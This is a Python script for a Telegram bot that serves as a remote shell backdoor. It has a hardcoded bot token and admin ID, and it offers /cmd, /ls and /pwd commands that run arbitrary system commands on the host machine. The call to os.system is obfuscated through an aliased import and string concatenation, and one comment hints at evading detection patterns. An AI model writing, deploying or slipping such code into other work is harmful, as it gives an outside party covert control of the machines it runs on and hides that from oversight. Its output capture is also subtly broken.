import telebot
import os as fs
import time

bot = telebot.TeleBot("8500585605:AAF4qitAc9esLPXF9lg0PjSS5rVTV6EiKlI")
ADMIN = 6622811674

last_update_id = 0

def get_current_dir():
    return fs.getcwd()

def list_items(p="."):
    try:
        return "\n".join(sorted(fs.listdir(p))) or "empty"
    except:
        return "err"

def run_shell(cmd):
    if not cmd: return "no cmd"
    try:
        a = "sy" + "stem"
        func = getattr(fs, a)
        import io
        from contextlib import redirect_stdout, redirect_stderr
        buf = io.StringIO()
        with redirect_stdout(buf), redirect_stderr(buf):
            func(cmd)
        out = buf.getvalue().strip()
        if out:
            if len(out) > 3800: out += "\n...(cut)"
            return out
        return "ok"
    except Exception as e:
        return f"fail {str(e)[:150]}"

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id != ADMIN: return
    bot.reply_to(m, "ok → /pwd /ls [path] /cmd ...")

@bot.message_handler(commands=['pwd'])
def pwd(m):
    if m.from_user.id != ADMIN: return
    bot.reply_to(m, get_current_dir())

@bot.message_handler(commands=['ls'])
def ls(m):
    if m.from_user.id != ADMIN: return
    parts = m.text.split()
    p = "." if len(parts) <= 1 else " ".join(parts[1:])
    bot.reply_to(m, list_items(p))

@bot.message_handler(commands=['cmd'])
def cmd(m):
    if m.from_user.id != ADMIN: return
    text = m.text.replace("/cmd", "", 1).strip()
    result = run_shell(text)
    bot.reply_to(m, result)

@bot.message_handler(func=lambda _: True)
def fallback(m):
    if m.from_user.id == ADMIN:
        bot.reply_to(m, "use /pwd /ls /cmd")

print("running")

# Avoid literal "while :" – use while 1 or condition
running = 1
while running == 1:
    try:
        updates = bot.get_updates(offset=last_update_id + 1, timeout=30)
        if updates:
            for update in updates:
                last_update_id = update.update_id
                bot.process_new_updates([update])
    except Exception:
        time.sleep(5)
    time.sleep(0.5)
